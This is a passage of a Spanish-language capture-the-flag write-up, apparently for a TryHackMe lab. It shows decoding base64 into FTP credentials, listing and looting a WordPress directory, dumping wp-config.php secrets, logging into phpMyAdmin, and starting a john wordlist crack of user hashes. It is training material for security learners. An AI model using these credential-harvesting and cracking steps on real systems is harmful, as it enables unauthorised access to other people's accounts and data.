+&lt;span class=&#34;nv&#34;&gt;RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
+╭─kali@kali ~/thm/differentctf 
+╰─➤  cat austrailian-bulldog-ant.jpg.out&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;base64 -d
+FTP-LOGIN
+USER: hakanftp
+PASS: NOTAPASSWORD
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;ftp---hakanftp&#34;&gt;FTP - HAKANFTP&lt;/h1&gt;
+&lt;p&gt;Ingresamos por el servicio FTP donde encontramos los archivos de wordpress, obtuvimos los archivos &lt;code&gt;.bash_history&lt;/code&gt; y &lt;code&gt;wp-config.php&lt;/code&gt;. Intentamos escribir un archivo para ejecucion de comandos pero tal parece que la carpeta no esta realacionada al wordpress del puerto 80.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ftp&amp;gt; ls -lah
+&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
+&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
+drwxrwxrwx    &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 12:26 .
+drwxrwxrwx    &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 12:26 ..
+-rw-------    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;           &lt;span class=&#34;m&#34;&gt;88&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; 11:06 .bash_history
+drwx------    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 10:29 .cache
+drwx------    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 10:29 .gnupg
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;          &lt;span class=&#34;m&#34;&gt;554&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 22:26 .htaccess
+drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 16:49 announcements
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;          &lt;span class=&#34;m&#34;&gt;405&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;06&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; index.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;19915&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; license.txt
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;7278&lt;/span&gt; Jun &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; readme.html
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;7101&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; wp-activate.php
+drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Dec &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt; 22:13 wp-admin
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;          &lt;span class=&#34;m&#34;&gt;351&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;06&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; wp-blog-header.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;2328&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; wp-comments-post.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;3194&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 09:55 wp-config.php
+drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Dec &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt; 22:13 wp-content
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;3939&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; wp-cron.php
+drwxr-xr-x   &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;12288&lt;/span&gt; Dec &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt; 22:13 wp-includes
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;2496&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;06&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; wp-links-opml.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;3300&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;06&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; wp-load.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;49831&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;09&lt;/span&gt; 10:53 wp-login.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;8509&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; wp-mail.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;20975&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; 14:43 wp-settings.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;31337&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; wp-signup.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4747&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; wp-trackback.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;3236&lt;/span&gt; Jun &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; xmlrpc.php
+&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Dentro del archivo &lt;code&gt;.bash_history&lt;/code&gt; no encontramos mucho, pero por el historial &lt;code&gt;hakanbey&lt;/code&gt; podria ser un usuario.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/thm/differentctf  
+╰─➤  cat .bash_history 
+id
+su root
+ls
+&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..
+ls
+&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /home
+ls
+&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; hakanbey/
+ls
+ls -la
+&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..
+ls
+&lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
+ls
+&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /
+ls
+&lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;En &lt;code&gt;wp-config.ph&lt;/code&gt; encontramos las credenciales para la base de datos &lt;code&gt;phpmyadmin1&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/thm/differentctf  
+╰─➤  cat wp-config.php&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep -v &lt;span class=&#34;s2&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;
+&amp;lt;?php
+
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_NAME&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;phpmyadmin1&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_USER&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;phpmyadmin&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_PASSWORD&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;NOTAPASSWORD&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_HOST&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_CHARSET&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;utf8mb4&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_COLLATE&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;SECURE_AUTH_KEY&amp;#39;&lt;/span&gt;,  &lt;span class=&#34;s1&#34;&gt;&amp;#39;@[5K4Q%_gsP%x=QJ]#-lX`BXVNSu7o}5=ht}L~/t%Txt Gx+&amp;lt;BX=,MeiiCHcXvc^&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;LOGGED_IN_KEY&amp;#39;&lt;/span&gt;,    &lt;span class=&#34;s1&#34;&gt;&amp;#39;,;0^d77wq7mtnGM1o%WaN.MpMJ9Zj69sI^)2cIVdR3h&amp;gt;YP/S:~SrIn+0AY$Adz.K&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;SECURE_AUTH_SALT&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;,V&amp;gt;-2!VKaBkkeRd|K&amp;amp;!([%}!;TfeA`@ikjcC/[]:: $.K&amp;amp;L.-`gk_3%t5/fu_Zd&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;LOGGED_IN_SALT&amp;#39;&lt;/span&gt;,   &lt;span class=&#34;s1&#34;&gt;&amp;#39;BOk(mP#GI:/ApR/z#w]p&amp;lt;-{smWKoG]qW=gAFR:W=tp_EVb:TN!@cVidma6l@2R$s&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+
+&lt;span class=&#34;nv&#34;&gt;$table_prefix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;wp_&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;WP_DEBUG&amp;#39;&lt;/span&gt;, &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; ! defined&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ABSPATH&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+        define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ABSPATH&amp;#39;&lt;/span&gt;, __DIR__ . &lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+
+require_once ABSPATH . &lt;span class=&#34;s1&#34;&gt;&amp;#39;wp-settings.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;phpmyadmin&#34;&gt;PHPMYADMIN&lt;/h1&gt;
+&lt;p&gt;Ingresamos a phpmyadmin con las credenciales encontradas y vemos dentro de las bases de datos &lt;code&gt;phpmyadmin, phpmyadmin1&lt;/code&gt; dos hashes que pertenecen al usuario &lt;code&gt;hackandbey01&lt;/code&gt;. Aunque solamente encontramos la contraseña de la base de datos de &lt;code&gt;phpmyadmin1&lt;/code&gt; la cual es la misma al usuario &lt;code&gt;phpmyadmin&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/thm/differentctf&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;4/4&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+╰─➤  john --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;wordlist.txt hashes
+Using default input encoding: UTF-8
